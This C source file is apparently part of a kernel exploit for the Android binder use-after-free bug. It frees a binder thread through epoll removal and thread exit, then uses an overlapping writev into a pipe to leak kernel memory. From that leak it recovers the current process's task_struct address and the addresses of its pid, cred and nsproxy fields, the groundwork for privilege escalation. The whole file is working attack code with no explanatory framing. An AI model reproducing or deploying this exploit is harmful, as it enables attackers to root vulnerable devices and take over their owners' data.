#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/uio.h>
#include <sys/wait.h>
#include <unistd.h>

#include "../include/binder_uaf.h"
#include "../include/event_poll.h"
#include "../include/log.h"

void binder_uaf_leak_task_struct(binder_ctx *ctx,
                                 struct task_struct **leak_task_struct,
                                 leaked_kernel_addrs *addrs) {

  int pipe_fd[2] = {0};
  ssize_t nBytesRead = 0;
  static char dataBuffer[PAGE_SIZE] = {0};
  struct iovec iovecStack[IOVEC_COUNT];
  struct epoll_event epoll_event_t = {.events = EPOLLIN};

  int epfd = event_pool_create();

  if (epfd < 0) {
    exit(EXIT_FAILURE);
  }

  int pipe_res = pipe(pipe_fd);

  if (pipe_res < 0) {
    ERROR("Unable to create pipe: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }

  SUCCESS("Pipes Created");

  int fcntl_res = fcntl(pipe_fd[0], F_SETPIPE_SZ, PAGE_SIZE);

  if (fcntl_res < 0) {
    ERROR("Failed to change pipe size: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }

  SUCCESS("Changed pipe capacity to : 0x%x", PAGE_SIZE);

  INFO("Setting up iovecs");

  memset(iovecStack, 0, sizeof(iovecStack));

  iovecStack[IOVEC_WQ_INDEX].iov_base = ctx->mapped;
  iovecStack[IOVEC_WQ_INDEX].iov_len = PAGE_SIZE;

  iovecStack[IOVEC_WQ_INDEX + 1].iov_base =
      (void *)((char *)(ctx->mapped) + PAGE_SIZE);
  iovecStack[IOVEC_WQ_INDEX + 1].iov_len = PAGE_SIZE;

  event_pool_add(epfd, ctx->fd, &epoll_event_t);

  pid_t childPid = fork();

  if (childPid == 0) {
    sleep(2);

    event_pool_remove(epfd, ctx->fd, &epoll_event_t);

    nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer));

    if (nBytesRead != PAGE_SIZE) {
      ERROR("Read failed: %s", strerror(errno));
      exit(EXIT_FAILURE);
    }

    exit(EXIT_SUCCESS);
  } else if (childPid > 0) {
    binder_thread_exit(ctx->fd);

    ssize_t nBytesWritten = writev(pipe_fd[1], iovecStack, IOVEC_COUNT);

    if (nBytesWritten != PAGE_SIZE * 2) {
      ERROR("Writev failed. nBytesWritten: 0x%lx, expected: 0x%x\n %s",
            nBytesWritten, PAGE_SIZE * 2, strerror(errno));
      close(pipe_fd[0]);
      close(pipe_fd[1]);
      kill(childPid, SIGKILL);
      wait(NULL);
      exit(EXIT_FAILURE);
    }

    INFO("Wrote 0x%lx bytes", nBytesWritten);

    nBytesRead = read(pipe_fd[0], dataBuffer, sizeof(dataBuffer));

    if (nBytesRead != PAGE_SIZE) {
      ERROR("Read failed: %s", strerror(errno));
      close(pipe_fd[0]);
      close(pipe_fd[1]);
      kill(childPid, SIGKILL);
      wait(NULL);
      exit(EXIT_FAILURE);
    }

    wait(NULL);

    close(pipe_fd[0]);
    close(pipe_fd[1]);

    *leak_task_struct = (struct task_struct *)*(
        (int64_t *)(dataBuffer + TASK_STRUCT_OFFSET_IN_LEAKED_DATA));
    addrs->pid = (void *)((int8_t *)(*leak_task_struct) +
                          offsetof(struct task_struct, pid));
    addrs->cred = (void *)((int8_t *)(*leak_task_struct) +
                           offsetof(struct task_struct, cred));
    addrs->nsproxy = (void *)((int8_t *)(*leak_task_struct) +
                              offsetof(struct task_struct, nsproxy));

    INFO("Leaked task_struct: %p", *leak_task_struct);
    INFO("task_struct->pid: %p", addrs->pid);
    INFO("task_struct->cred: %p", addrs->cred);
    INFO("task_struct->nsproxy: %p", addrs->nsproxy);
  } else {
    ERROR("Fork failed: %s", strerror(errno));
    exit(EXIT_FAILURE);
  }
}